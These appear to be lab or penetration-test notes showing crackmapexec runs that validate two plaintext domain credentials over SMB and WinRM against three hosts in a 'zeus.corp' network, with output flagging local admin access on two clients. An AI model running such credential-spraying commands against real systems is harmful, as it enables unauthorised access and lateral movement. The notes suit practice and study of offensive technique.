Eric

└─$ crackmapexec smb 192.168.143.158-160 -u Eric.Wallows -p 'EricLikesRunning800'

SMB         192.168.143.158 445    DC01             \[*\] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:zeus.corp) (signing:True) (SMBv1:False)

SMB         192.168.143.160 445    CLIENT02         \[*\] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT02) (domain:zeus.corp) (signing:False) (SMBv1:False)

SMB         192.168.143.159 445    CLIENT01         \[*\] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT01) (domain:zeus.corp) (signing:False) (SMBv1:False)

SMB         192.168.143.158 445    DC01             \[+\] zeus.corp\Eric.Wallows:EricLikesRunning800

SMB         192.168.143.160 445    CLIENT02         \[+\] zeus.corp\Eric.Wallows:EricLikesRunning800

SMB         192.168.143.159 445    CLIENT01         \[+\] zeus.corp\Eric.Wallows:EricLikesRunning800 (Pwn3d!)

![[crackmapexe image.png]]

o.foller

└─$ crackmapexec smb 192.168.143.158-160 -u o.foller -p 'EarlyMorningFootball777'

SMB         192.168.143.158 445    DC01             \[*\] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:zeus.corp) (signing:True) (SMBv1:False)

SMB         192.168.143.160 445    CLIENT02         \[*\] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT02) (domain:zeus.corp) (signing:False) (SMBv1:False)

SMB         192.168.143.159 445    CLIENT01         \[*\] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT01) (domain:zeus.corp) (signing:False) (SMBv1:False)

SMB         192.168.143.158 445    DC01             \[+\] zeus.corp\o.foller:EarlyMorningFootball777

SMB         192.168.143.160 445    CLIENT02         \[+\] zeus.corp\o.foller:EarlyMorningFootball777 (Pwn3d!)

SMB         192.168.143.159 445    CLIENT01         \[+\] zeus.corp\o.foller:EarlyMorningFootball777

└─$ crackmapexec winrm 192.168.143.158-160 -u o.foller -p 'EarlyMorningFootball777'

SMB         192.168.143.159 5985   CLIENT01         \[*\] Windows 10 / Server 2019 Build 19041 (name:CLIENT01) (domain:zeus.corp)

HTTP        192.168.143.159 5985   CLIENT01         \[*\] http://192.168.143.159:5985/wsman

SMB         192.168.143.158 5985   DC01             \[*\] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:zeus.corp)

HTTP        192.168.143.158 5985   DC01             \[*\] http://192.168.143.158:5985/wsman

/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.

arc4 = algorithms.ARC4(self._key)

WINRM       192.168.143.159 5985   CLIENT01         \[-\] zeus.corp\o.foller:EarlyMorningFootball777

/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.

arc4 = algorithms.ARC4(self._key)

WINRM       192.168.143.158 5985   DC01             \[-\] zeus.corp\o.foller:EarlyMorningFootball777

![[crackmapexe image 1.png]]